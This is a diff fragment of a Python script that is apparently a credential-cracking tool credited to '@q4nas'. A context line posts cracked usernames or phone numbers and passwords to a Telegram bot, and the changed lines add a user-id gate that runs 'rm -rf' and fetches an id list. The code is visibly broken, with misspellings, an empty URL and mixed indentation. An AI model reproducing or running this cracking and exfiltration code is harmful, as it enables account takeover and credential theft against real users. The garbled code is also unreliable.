@@ -165,20 +165,8 @@ while True:
             requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=\nCrack By : @q4nas\n~~~~~~~~~~~~~~~~~\nNUM : {username}\nPASS : {password}\nTEST : ({h})\nGOOD : ({zz})\nBAD : ({aa})\n~~~~~~~~~~~~~~~~~\nT.ME : @qan4s | T.CH : anas_hacker0")
             aa+=1
             print(E+f'BAD : {h}')
-else:
-    print ('Telegram : @i4m_qamar')
-
-    os.system('rm -rf list.txt')
-    os.system('id -u > list,txt')
-    uuid = open('list.txt', 'r')
-    for n in uuid:
-        qanas = n.split()
-
-    idlist = requests.get('')
-    idact = idlist.texT
-	
-        for nn in idact.split():
-            print(nn)
-        if nn == qanas[0]:
-            if __name__ == '__main__':
-                kurd()
+	else:
+		for nn in idact.split():
+			print(nn)
+			if nn == qanas[0]:
+				if __name__ == '__main__':
